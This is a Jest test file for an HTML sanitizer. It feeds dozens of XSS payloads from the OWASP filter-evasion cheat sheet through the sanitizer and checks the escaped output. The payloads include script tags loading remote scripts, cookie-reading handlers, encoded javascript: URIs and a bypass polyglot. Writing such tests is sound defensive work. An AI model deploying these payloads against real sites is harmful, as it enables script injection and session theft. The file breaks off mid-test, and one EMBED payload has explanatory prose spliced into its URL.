import { Sanitizer } from './index';

// Tests come from:
// https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

describe('XSS Sanitizing', () => {
  test('XSS Locator', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//"alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>';
    const clean =
      '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//"alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;\'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('XSS Locator (short)', () => {
    const sanitizer = new Sanitizer();
    const dirty = "'';!--\"<XSS>=&{()}";
    const clean = "'';!--\"&lt;XSS&gt;=&{()}";

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('No Filter Evasion', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>';
    const clean = '&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Filter bypass based polyglot', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext></|><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'"><img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">';
    const clean =
      '\'"&gt;&gt;&lt;marquee&gt;<img src>&lt;/marquee&gt;"&gt;&lt;/plaintext&gt;&lt;/|&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;\'--&gt;"&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;&lt;img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)&gt;\'"&gt;<img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Image XSS using the JavaScript directive', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC="javascript:alert(\'XSS\');">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('No quotes and no semicolon', () => {
    const sanitizer = new Sanitizer();
    const dirty = "<IMG SRC=javascript:alert('XSS')>";
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Case insensitive XSS attack vector', () => {
    const sanitizer = new Sanitizer();
    const dirty = "<IMG SRC=JaVaScRiPt:alert('XSS')>";
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('HTML entities', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC=javascript:alert(&quot;XSS&quot;)>';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Grave accent obfuscation', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Malformed A tags', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<a onmouseover="alert(document.cookie)">xxs link</a>';
    const clean = '<a>xxs link</a>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);

    const dirtyChrome = '<a onmouseover=alert(document.cookie)>xxs link</a>';
    const cleanChrome = '<a>xxs link</a>';

    expect(sanitizer.sanitize(dirtyChrome)).toEqual(cleanChrome);
  });

  test('Malformed IMG tags', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">';
    const clean = '<img>&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('fromCharCode', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Default SRC tag to get past filters that check SRC domain', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC=# onmouseover="alert(\'xxs\')">';
    const clean = '<img src="#">';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Default SRC tag by leaving it empty', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC= onmouseover="alert(\'xxs\')">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Default SRC tag by leaving it out entirely', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG onmouseover="alert(\'xxs\')">';
    const clean = '<img>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('On error alert', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>';
    const clean = '<img src="/"></img>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('IMG onerror and javascript alert encode', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Decimal HTML character references', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Decimal HTML character references without trailing semicolons', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Hexadecimal HTML character references without trailing semicolons', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Embedded tab', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC="jav	ascript:alert(\'XSS\');">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Embedded Encoded tab', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Embedded newline to break up XSS', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Embedded carriage return to break up XSS', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Null breaks up JavaScript directive', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      'perl -e \'print "<IMG SRC=java\0script:alert("XSS")>";\' >out';
    const clean = 'perl -e \'print "<img src>";\' &gt;out';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Spaces and meta chars before the JavaScript in images for XSS', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Non-alpha-non-digit XSS', () => {
    const sanitizer = new Sanitizer();
    const dirty1 = '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>';
    const clean1 =
      '&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;';

    expect(sanitizer.sanitize(dirty1)).toEqual(clean1);

    const dirty2 = '<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>';
    const clean2 = '&lt;BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")&gt;';

    expect(sanitizer.sanitize(dirty2)).toEqual(clean2);

    const dirty3 = '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>';
    const clean3 =
      '&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;';

    expect(sanitizer.sanitize(dirty3)).toEqual(clean3);
  });

  test('Extraneous open brackets', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<<SCRIPT>alert("XSS");//<</SCRIPT>';
    const clean = '&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('No closing script tags', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<SCRIPT SRC=http://xss.rocks/xss.js?< B >';
    const clean = '&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Protocol resolution in script tags', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<SCRIPT SRC=//xss.rocks/.j>';
    const clean = '&lt;SCRIPT SRC=//xss.rocks/.j&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Half open HTML/JavaScript XSS vector', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC="javascript:alert(\'XSS\')"';
    const clean = '&lt;IMG SRC="javascript:alert(\'XSS\')"';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Double open angle brackets', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<iframe src=http://xss.rocks/scriptlet.html <"';
    const clean = '&lt;iframe src=http://xss.rocks/scriptlet.html &lt;"';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Escaping JavaScript escapes', () => {
    const sanitizer = new Sanitizer();
    const dirty = "</script><script>alert('XSS');</script>";
    const clean = "&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;";

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('End title tag', () => {
    const sanitizer = new Sanitizer();
    const dirty = '</TITLE><SCRIPT>alert("XSS");</SCRIPT>';
    const clean = '&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('INPUT image', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">';
    const clean = '&lt;INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('BODY image', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<BODY BACKGROUND="javascript:alert(\'XSS\')">';
    const clean = '&lt;BODY BACKGROUND="javascript:alert(\'XSS\')"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('IMG Dynsrc', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG DYNSRC="javascript:alert(\'XSS\')">';
    const clean = '<img>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('IMG lowsrc', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG LOWSRC="javascript:alert(\'XSS\')">';
    const clean = '<img>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('List-style-image', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>';
    const clean =
      '&lt;STYLE&gt;li {list-style-image: url("javascript:alert(\'XSS\')");}&lt;/STYLE&gt;<ul><li>XSS</br>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('VBscript in an image', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC=\'vbscript:msgbox("XSS")\'>';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Livescript (older versions of Netscape only)', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG SRC="livescript:[code]">';
    const clean = '<img src>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('SVG object tag', () => {
    const sanitizer = new Sanitizer();
    const dirty = "<svg/onload=alert('XSS')>";
    const clean = "&lt;svg/onload=alert('XSS')&gt;";

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('BODY tag', () => {
    const sanitizer = new Sanitizer();
    const dirty = "<BODY ONLOAD=alert('XSS')>";
    const clean = "&lt;BODY ONLOAD=alert('XSS')&gt;";

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Event handlers', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<img src="https://example.com./images/test.jpg" fscommand="alert(1)" onabort="alert(1)" onactivate="alert(1)" onafterprint="alert(1)" onafterupdate="alert(1)" onbeforeactivate="alert(1)" onbeforecopy="alert(1)" onbeforecut="alert(1)" onbeforedeactivate="alert(1)" onbeforeeditfocus="alert(1)" onbeforepaste="alert(1)" onbeforeprint="alert(1)" onbeforeunload="alert(1)" onbeforeupdate="alert(1)" onbegin="alert(1)" onblur="alert(1)" onbounce="alert(1)" oncellchange="alert(1)" onchange="alert(1)" onclick="alert(1)" oncontextmenu="alert(1)" oncontrolselect="alert(1)" oncopy="alert(1)" oncut="alert(1)" ondataavailable="alert(1)" ondatasetchanged="alert(1)" ondatasetcomplete="alert(1)" ondblclick="alert(1)" ondeactivate="alert(1)" ondrag="alert(1)" ondragend="alert(1)" ondragleave="alert(1)" ondragenter="alert(1)" ondragover="alert(1)" ondragdrop="alert(1)" ondragstart="alert(1)" ondrop="alert(1)" onend="alert(1)" onerror="alert(1)" onerrorupdate="alert(1)" onfilterchange="alert(1)" onfinish="alert(1)" onfocus="alert(1)" onfocusin="alert(1)" onfocusout="alert(1)" onhashchange="alert(1)" onhelp="alert(1)" oninput="alert(1)" onkeydown="alert(1)" onkeypress="alert(1)" onkeyup="alert(1)" onlayoutcomplete="alert(1)" onload="alert(1)" onlosecapture="alert(1)" onmediacomplete="alert(1)" onmediaerror="alert(1)" onmessage="alert(1)" onmousedown="alert(1)" onmouseenter="alert(1)" onmouseleave="alert(1)" onmousemove="alert(1)" onmouseout="alert(1)" onmouseover="alert(1)" onmouseup="alert(1)" onmousewheel="alert(1)" onmove="alert(1)" onmoveend="alert(1)" onmovestart="alert(1)" onoffline="alert(1)" ononline="alert(1)" onoutofsync="alert(1)" onpaste="alert(1)" onpause="alert(1)" onpopstate="alert(1)" onprogress="alert(1)" onpropertychange="alert(1)" onreadystatechange="alert(1)" onredo="alert(1)" onrepeat="alert(1)" onreset="alert(1)" onresize="alert(1)" onresizeend="alert(1)" onresizestart="alert(1)" onresume="alert(1)" onreverse="alert(1)" onrowsenter="alert(1)" onrowexit="alert(1)" onrowdelete="alert(1)" onrowinserted="alert(1)" onscroll="alert(1)" onseek="alert(1)" onselect="alert(1)" onselectionchange="alert(1)" onselectstart="alert(1)" onstart="alert(1)" onstop="alert(1)" onstorage="alert(1)" onsyncrestored="alert(1)" onsubmit="alert(1)" ontimeerror="alert(1)" ontrackchange="alert(1)" onundo="alert(1)" onunload="alert(1)" onurlflip="alert(1)" seeksegmenttime="alert(1)" />';
    const clean = '<img src="https://example.com./images/test.jpg" />';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('BGSOUND', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<BGSOUND SRC="javascript:alert(\'XSS\');">';
    const clean = '&lt;BGSOUND SRC="javascript:alert(\'XSS\');"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('& JavaScript includes', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<BR SIZE="&{alert(\'XSS\')}">';
    const clean = '<br>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('STYLE sheet', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">';
    const clean =
      '&lt;LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Remote style sheet', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">';
    const clean =
      '&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Remote style sheet part 2', () => {
    const sanitizer = new Sanitizer();
    const dirty = "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>";
    const clean =
      "&lt;STYLE&gt;@import'http://xss.rocks/xss.css';&lt;/STYLE&gt;";

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Remote style sheet part 3', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">';
    const clean =
      '&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Remote style sheet part 4', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>';
    const clean =
      '&lt;STYLE&gt;BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('STYLE tags with broken up JavaScript for XSS', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<STYLE>@import\'ja\vasc\ript:alert("XSS")\';</STYLE>';
    const clean =
      '&lt;STYLE&gt;@import\'ja\vasc\ript:alert("XSS")\';&lt;/STYLE&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('STYLE attribute using a comment to break up expression', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">';
    const clean = '<img style>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('STYLE attribute using a comment to break up expression', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">';
    const clean = '<img style>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('IMG STYLE with expression', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      'exp/*<A STYLE=\'noxss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))\'>';
    const clean = 'exp/*<a style>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('STYLE tag (Older versions of Netscape only)', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>';
    const clean =
      '&lt;STYLE TYPE="text/javascript"&gt;alert(\'XSS\');&lt;/STYLE&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('STYLE tag using background-image', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>';
    const clean =
      '&lt;STYLE&gt;.XSS{background-image:url("javascript:alert(\'XSS\')");}&lt;/STYLE&gt;<a></a>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('STYLE tag using background', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>';
    const clean =
      '&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert(\'XSS\')")}&lt;/STYLE&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Anonymous HTML with STYLE attribute', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<XSS STYLE="xss:expression(alert(\'XSS\'))">';
    const clean = '&lt;XSS STYLE="xss:expression(alert(\'XSS\'))"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Local htc file', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<XSS STYLE="behavior: url(xss.htc);">';
    const clean = '&lt;XSS STYLE="behavior: url(xss.htc);"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('META', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">';
    const clean =
      '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('META using data', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">';
    const clean =
      '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('META with additional URL parameter', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">';
    const clean =
      '&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('IFRAME', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>';
    const clean =
      '&lt;IFRAME SRC="javascript:alert(\'XSS\');"&gt;&lt;/IFRAME&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('IFRAME Event based', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>';
    const clean =
      '&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('FRAME', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>';
    const clean =
      '&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert(\'XSS\');"&gt;&lt;/FRAMESET&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('TABLE', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<TABLE BACKGROUND="javascript:alert(\'XSS\')">';
    const clean = '<table>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('TD', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">';
    const clean = '<table><td>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('DIV background-image', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">';
    const clean = '<div style>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('DIV background-image plus extra characters', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">';
    const clean = '<div style>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('DIV expression', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<DIV STYLE="width: expression(alert(\'XSS\'));">';
    const clean = '<div style>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Downlevel-Hidden block', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->";
    const clean =
      "&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;&lt;![endif]--&gt;";

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('BASE tag', () => {
    const sanitizer = new Sanitizer();
    const dirty = '<BASE HREF="javascript:alert(\'XSS\');//">';
    const clean = '&lt;BASE HREF="javascript:alert(\'XSS\');//"&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('OBJECT tag', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>';
    const clean =
      '&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/OBJECT&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Using an EMBED tag you can embed a Flash movie that contains XSS', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>';
    const clean =
      '&lt;EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('You can EMBED SVG which can contain your XSS vector', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>';
    const clean =
      '&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('XML data island with CDATA obfuscation', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>';
    const clean =
      '&lt;XML ID="xss"&gt;<i><b><img src></b></i>&lt;/XML&gt;<span></span>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('Locally hosted XML with embedded JavaScript that is generated using an XML data island', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>';
    const clean = '&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;<span></span>';

    expect(sanitizer.sanitize(dirty)).toEqual(clean);
  });

  test('HTML+TIME in XML', () => {
    const sanitizer = new Sanitizer();
    const dirty =
      '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>';
